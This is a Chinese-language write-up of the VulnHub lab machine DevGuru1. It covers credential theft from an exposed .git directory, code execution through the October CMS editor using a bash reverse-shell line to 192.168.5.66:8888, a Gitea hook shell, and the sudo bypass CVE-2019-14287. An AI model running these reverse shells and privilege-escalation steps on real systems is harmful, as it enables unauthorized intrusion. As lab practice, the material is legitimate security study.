+++
title = '0x075 DevGuru1'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCEa6bd581c7fa48e8387927f35ab208b15image.png)

![](/vulnhub_img/WEBRESOURCEc1ec935487287800c122de86ac7c5ca1image.png)

![](/vulnhub_img/WEBRESOURCEab0eb3cd79e56fd6201ff24ccc811738image.png)

# 渗透测试

发现.git目录，通过githack下载下来，然后发现了数据库账号密码：

![](/vulnhub_img/WEBRESOURCE8dd235d87d2355774597af94e8fb30efimage.png)

'database'   => 'octoberdb',

'username'   => 'october',

'password'   => 'SQ66EBYx4GT3byXH',

![](/vulnhub_img/WEBRESOURCEbf21fb3ee14daec200095b3a301244b8image.png)

同时gobuster发现：

adminer页数据库管理工具

![](/vulnhub_img/WEBRESOURCE3ced553e1389cd923303f402a70e2915image.png)

登录成功：

![](/vulnhub_img/WEBRESOURCE97a08d1024d194c8ab57d630ba5799b6image.png)

密码hash，但是很可惜，没查到：

![](/vulnhub_img/WEBRESOURCEe0771862accbd7f518a859a72f8575cdimage.png)

但是可以添加用户：

然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：

![](/vulnhub_img/WEBRESOURCE92ac5b683cd5ef0df12b828557a6c627image.png)

![](/vulnhub_img/WEBRESOURCEd13a3917207d11119925f9abac161e5bimage.png)

![](/vulnhub_img/WEBRESOURCE94324b682221c4a4caa0ddaf3cc979e5image.png)

研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：

markup:

{{ this.page.PoisonVar }}

![](/vulnhub_img/WEBRESOURCEdc09ba803a04971615e53d09065fccecimage.png)

code:

function onStart()

{

$this->page["PoisonVar"] = exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.5.66/8888 0>&1'");

}

![](/vulnhub_img/WEBRESOURCE8977ba30df11367a2b749669714d7359image.png)

点

![](/vulnhub_img/WEBRESOURCEa76361b23e24377e0f540594b22e9401image.png)

# 提权

秒了再说：

![](/vulnhub_img/WEBRESOURCEed85c3d72e11a842fd81fdfb3eab3d46image.png)

看一下作者留下的提权路径：

![](/vulnhub_img/WEBRESOURCE9ad82454162eda220198d40c97696638image.png)

数据库：

; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".

DB_TYPE             = mysql

HOST                = 127.0.0.1:3306

NAME                = gitea

USER                = gitea

; Use PASSWD = your password for quoting if you use special characters in the password.

PASSWD              = UfFPTF8C8jjxVF2m

![](/vulnhub_img/WEBRESOURCEd4c4b971dc31e9290ecbfbce57f60b0cimage.png)

这里可以用mysql命令行，也可以用之前的adminer，当然图形化好一点：

![](/vulnhub_img/WEBRESOURCE1a7746e5adf642ed47b6f9a2ddfba372image.png)

修改密码为这个：

pbkdf2算法：

123456

4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb

![](/vulnhub_img/WEBRESOURCE735b82cf09ae0d4270186b615b8d10b7image.png)

添加反弹shell:

![](/vulnhub_img/WEBRESOURCE9ebc7eb7325b601c6413cc7f46ba6e17image.png)

随便修改一个文件：

![](/vulnhub_img/WEBRESOURCE55b5bc413dbdc5d73faa1ddafc18cdfeimage.png)

就可以拿到

![](/vulnhub_img/WEBRESOURCE2d69b4d86045fa6b425400cf56ddd452image.png)

sudo 提权：

这里利用了CVE-2019-14287 sudo权限绕过漏洞，在允许使用所有用户，但是仅仅不允许使用root用户的时候可以尝试，加上

-u#-1

![](/vulnhub_img/WEBRESOURCEf6513c76974a24d98418cd526f314a57image.png)